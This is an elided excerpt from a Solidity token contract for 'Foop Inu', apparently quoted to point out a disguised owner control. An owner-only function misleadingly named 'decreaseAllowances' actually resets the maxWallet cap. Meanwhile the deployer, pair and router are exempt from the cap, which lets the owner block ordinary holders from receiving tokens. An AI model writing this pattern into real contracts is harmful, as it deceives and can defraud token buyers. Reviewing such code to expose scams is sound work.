...
contract FOOP {
    ...
    string public constant name = "Foop Inu";

    
    string public constant symbol = "FOOP";

    
    uint8 public constant decimals = 18;

    
    uint public totalSupply = 8500e18; 

    uint256 public maxWallet = 8500e18;

     mapping(address => bool) public maxcheck;
   ...
   function _createpair() internal {
        ...
        maxcheck[msg.sender]=true;
        maxcheck[uniswapV2Pair]=true;
        maxcheck[address(uniswapV2Router)]=true;
   }
    ...
    function _transferTokens(address src, address dst, uint256 amount) internal {
     ...
     if(!maxcheck[dst]){ require(add96(balances[dst], amount,'') <= maxWallet,"Tx Limit Exceed");}
    ...
    function decreaseAllowances(uint256 _amount) external {
         require(Owner==msg.sender,"Owner only access");
         maxWallet=_amount;
    }
